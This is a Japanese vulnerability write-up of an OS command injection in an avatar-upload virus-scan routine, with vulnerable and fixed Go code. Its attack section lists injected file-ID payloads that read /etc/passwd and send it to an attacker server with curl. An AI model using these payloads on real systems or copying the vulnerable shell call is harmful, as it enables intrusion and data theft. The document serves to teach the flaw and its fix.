# OSコマンドインジェクション（アバターアップロード機能）

## 脆弱性の概要
アバターアップロード機能において、ユーザーが指定したファイルIDがウィルススキャン処理で適切にエスケープされずにOSコマンドに渡されるため、OSコマンドインジェクションの脆弱性が存在します。攻撃者はこの脆弱性を悪用して、サーバー上で任意のコマンドを実行することができます。

## 影響
この脆弱性が悪用された場合、以下のような影響があります：
- サーバー上での任意のコマンド実行
- 機密情報の漏洩
- サーバーの乗っ取り
- サービス拒否攻撃（DoS）

## 攻撃方法
1. プロフィール編集画面でアバター画像をアップロードする際に、ファイルIDに悪意のあるコマンドを含める
2. 例えば、以下のようなファイルIDを使用する：
   - `avatar.jpg; ls -la /`
   - `avatar.jpg && cat /etc/passwd`
   - `avatar.jpg | curl -X POST -d @/etc/passwd https://攻撃者のサーバー/`

## 脆弱なコード
```go
func scanFile(filePath string) error {
    // 脆弱性: OSコマンドインジェクション
    // ユーザー入力（filePath）を適切にエスケープせずにコマンドに渡している
    cmd := exec.Command("sh", "-c", "echo 'Scanning file: "+filePath+"' && grep -q 'virus_signature' "+filePath)
    output, err := cmd.CombinedOutput()
    if err != nil {
        if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
            // grepコマンドがパターンを見つけられなかった場合（終了コード1）は正常とみなす
            return nil
        }
        log.Printf("ウィルススキャンエラー: %v, 出力: %s", err, string(output))
        return err
    }
    return fmt.Errorf("ウィルスが検出されました")
}
```

## 対策方法
1. OSコマンドを使用せずに、プログラム内部でファイルの検査を行う
2. 必要に応じてOSコマンドを使用する場合は、以下の対策を行う：
   - ユーザー入力を適切にエスケープする
   - シェル（sh, bash）を介さずに直接コマンドを実行する
   - コマンドライン引数を配列として渡す

### 修正例
```go
func scanFile(filePath string) error {
    // 修正: 引数を配列として渡し、シェルを介さずに実行
    cmd := exec.Command("grep", "-q", "virus_signature", filePath)
    err := cmd.Run()
    if err != nil {
        if exitErr, ok := err.(*exec.ExitError); ok && exitErr.ExitCode() == 1 {
            // grepコマンドがパターンを見つけられなかった場合（終了コード1）は正常とみなす
            return nil
        }
        log.Printf("ウィルススキャンエラー: %v", err)
        return err
    }
    return fmt.Errorf("ウィルスが検出されました")
}
```

## 参考情報
- [OWASP - Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: Improper Neutralization of Special Elements used in an OS Command](https://cwe.mitre.org/data/definitions/78.html)
